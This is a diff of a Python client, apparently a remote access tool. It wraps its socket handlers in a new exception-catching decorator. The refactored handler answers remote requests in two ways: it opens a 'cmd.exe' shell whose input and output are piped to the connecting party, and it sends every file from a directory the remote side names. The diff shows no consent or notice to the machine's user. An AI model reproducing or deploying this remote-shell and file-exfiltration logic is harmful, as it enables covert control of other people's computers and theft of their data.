@@ -50,6 +50,16 @@ def createServer(port=0):
     server.listen(5)
     return server
 
+# create a decorator to try the function and catch any exceptions
+def try_connection(func):
+    def wrapper(*args, **kwargs):
+        try:
+            return func(*args, **kwargs)
+        except ConnectionAbortedError:
+            print("Connection disconnected by server without message")
+    return wrapper
+
+@try_connection
 def receive(sock, proc):
     while True:
         data = sock.recv(1024)
@@ -59,58 +69,56 @@ def receive(sock, proc):
         proc.stdin.write("\n".encode())
         proc.stdin.flush()
 
+@try_connection
 def handleOpenConnection(server):
-    try:
-        client, address = server.accept()
-        print("OpenConnection from: " + str(address))
+    client, address = server.accept()
+    print("OpenConnection from: " + str(address))
 
-        # listener loop
-        while True:
-            # read message
-            size, message = NetProtocol.unpackFromSocket(client)
-            if size == -1:
-                # if server disconnected, close local open connection server
-                server.shutdown(socket.SHUT_RDWR)
+    # listener loop
+    while True:
+        # read message
+        size, message = NetProtocol.unpackFromSocket(client)
+        if size == -1:
+            # if server disconnected, close local open connection server
+            server.shutdown(socket.SHUT_RDWR)
+            break
+        message = orjson.loads(message)  # convert the message to dictionary from json
+
+        id = message['id'] # get the echo id of the message, to echo back to the server when sending response
+
+        # if message is a request
+        if message['type'] == NetTypes.NetRequest.value:
+            # if the request is to close the connection
+            if message['data'] == NetTypes.NetCloseConnection.value:
+                print(f"Closing unmanaged connection {address}")
+                server.close()
                 break
-            message = orjson.loads(message)  # convert the message to dictionary from json
 
-            id = message['id'] # get the echo id of the message, to echo back to the server when sending response
+            # if the request is to open a shell connection
+            elif message['data'] == NetTypes.NetOpenShell.value:
+                # open shell process
+                import subprocess
+                p = subprocess.Popen("cmd.exe", stdout=subprocess.PIPE, stdin=subprocess.PIPE,
+                                     stderr=subprocess.STDOUT, shell=True)
+                thread = threading.Thread(target=receive, args=(client, p,))
+                thread.start()
+                client.send(NetProtocol.packNetMessage(NetMessage(type=NetTypes.NetStatus, data=NetStatus(NetStatusTypes.NetOK.value), id=id)))
+                while p.poll() is None:
+                    n = p.stdout.readline()
+                    client.send(n)
 
-            # if message is a request
-            if message['type'] == NetTypes.NetRequest.value:
-                # if the request is to close the connection
-                if message['data'] == NetTypes.NetCloseConnection.value:
-                    print(f"Closing unmanaged connection {address}")
-                    server.close()
-                    break
+            # if the request is to download file
+            elif message['data'] == NetTypes.NetDownloadFile.value:
+                # get the file directory
+                directory = message['extra']
 
-                # if the request is to open a shell connection
-                elif message['data'] == NetTypes.NetOpenShell.value:
-                    # open shell process
-                    import subprocess
-                    p = subprocess.Popen("cmd.exe", stdout=subprocess.PIPE, stdin=subprocess.PIPE,
-                                         stderr=subprocess.STDOUT, shell=True)
-                    thread = threading.Thread(target=receive, args=(client, p,))
-                    thread.start()
-                    client.send(NetProtocol.packNetMessage(NetMessage(type=NetTypes.NetStatus, data=NetStatus(NetStatusTypes.NetOK.value), id=id)))
-                    while p.poll() is None:
-                        n = p.stdout.readline()
-                        client.send(n)
+                # send all files
+                sendallfiles(client, directory)
 
-                # if the request is to download file
-                elif message['data'] == NetTypes.NetDownloadFile.value:
-                    # get the file directory
-                    directory = message['extra']
+                # send file download end status
+                client.send(NetProtocol.packNetMessage(NetMessage(NetTypes.NetStatus.value, NetStatus(NetStatusTypes.NetDownloadFinished.value))))
 
-                    # send all files
-                    sendallfiles(client, directory)
-
-                    # send file download end status
-                    client.send(NetProtocol.packNetMessage(NetMessage(NetTypes.NetStatus.value, NetStatus(NetStatusTypes.NetDownloadFinished.value))))
-    except ConnectionResetError:
-        print("Connection disconnected by server without message")
-
-
+@try_connection
 def main():
     # create a socket
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
